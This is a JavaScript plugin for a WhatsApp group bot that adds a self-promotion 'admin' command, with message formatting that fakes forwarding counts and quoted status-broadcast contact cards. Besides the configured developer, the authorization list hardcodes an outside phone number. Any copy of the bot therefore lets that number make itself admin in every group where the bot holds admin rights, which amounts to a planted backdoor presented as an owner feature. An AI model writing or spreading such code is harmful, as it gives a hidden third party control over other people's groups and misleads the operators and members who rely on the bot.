const { cmd } = require('../command');
const config = require('../config');

// Formatted message function
async function sendFormattedMessage(conn, from, text, sender, userName, externalBody = '', bodyText = '') {
    try {
        await conn.sendMessage(from, {
            text: text,
            contextInfo: {
                isForwarded: true,
                title: "ɴᴊᴀʙᴜʟᴏ ᴜɪ",
                body: bodyText || text,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: config.NEWSLETTER,
                    newsletterName: '╭••➤ɴᴊᴀʙᴜʟᴏ ᴜɪ',
                    serverMessageId: 143
                },
                forwardingScore: 999,
                externalAdReply: {
                    title: "ɴᴊᴀʙᴜʟᴏ ᴜɪ",
                    body: externalBody || "Admin Manager",
                    thumbnailUrl: config.FANAIMG,
                    sourceUrl: config.NJABULOURL,
                    mediaType: 1,
                    renderSmallThumbnail: true
                }
            }
        }, { 
            quoted: {
                key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`,
                    remoteJid: "status@broadcast"
                },
                message: {
                    contactMessage: {
                        displayName: userName || "User",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${userName || "User"};USER;;;\nFN:${userName || "User"}\nitem1.TEL;waid=${sender?.split('@')[0] || '0'}:${sender?.split('@')[0] || '0'}\nitem1.X-ABLabel:User\nEND:VCARD`
                    }
                }
            }
        });
    } catch (err) {
        console.error("Error in sendFormattedMessage:", err);
        await conn.sendMessage(from, { text: text });
    }
}

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin", "getadmin", "selfadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply, pushname }) => {
    // Verify group context
    if (!isGroup) {
        await sendFormattedMessage(
            conn, 
            from, 
            "❌ *This command can only be used in groups.*", 
            sender, 
            pushname,
            "Admin Manager - Error",
            "Not a group"
        );
        return;
    }

    // Verify bot is admin
    if (!isBotAdmins) {
        await sendFormattedMessage(
            conn, 
            from, 
            "❌ *I need to be an admin to perform this action.*\n\nPlease make me an admin first.", 
            sender, 
            pushname,
            "Admin Manager - Error",
            "Bot not admin"
        );
        return;
    }

    // Normalize JIDs for comparison
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users (properly formatted JIDs)
    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "255687068672@s.whatsapp.net"
    ].filter(Boolean);

    // Check authorization with normalized JIDs
    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        await sendFormattedMessage(
            conn, 
            from, 
            "❌ *This command is restricted to authorized users only*\n\nOnly the bot owner can use this command.", 
            sender, 
            pushname,
            "Admin Manager - Access Denied",
            "Unauthorized"
        );
        return;
    }

    await sendFormattedMessage(
        conn, 
        from, 
        `👑 *Processing admin request...*\n\n⏳ Please wait!`, 
        sender, 
        pushname,
        "Admin Manager",
        "Requesting admin rights"
    );

    try {
        // Get current group metadata
        const groupMetadata = await conn.groupMetadata(from);
        
        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            await sendFormattedMessage(
                conn, 
                from, 
                `ℹ️ *You're already an admin in this group*\n\n👑 No changes were made.`, 
                sender, 
                pushname,
                "Admin Manager",
                "Already admin"
            );
            return;
        }

        // Promote self to admin
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        
        await sendFormattedMessage(
            conn, 
            from, 
            `✅ *Admin rights granted successfully!*\n\n👑 Congratulations! You are now an admin of this group.\n\n🔒 *Please use this power responsibly.*`, 
            sender, 
            pushname,
            "Admin Manager - Success",
            "Admin rights granted"
        );
        
    } catch (error) {
        console.error("Admin command error:", error);
        await sendFormattedMessage(
            conn, 
            from, 
            `❌ *Failed to grant admin rights*\n\n⚠️ ${error.message}\n\nPlease try again later or contact support.`, 
            sender, 
            pushname,
            "Admin Manager - Error",
            "Promotion failed"
        );
    }
});
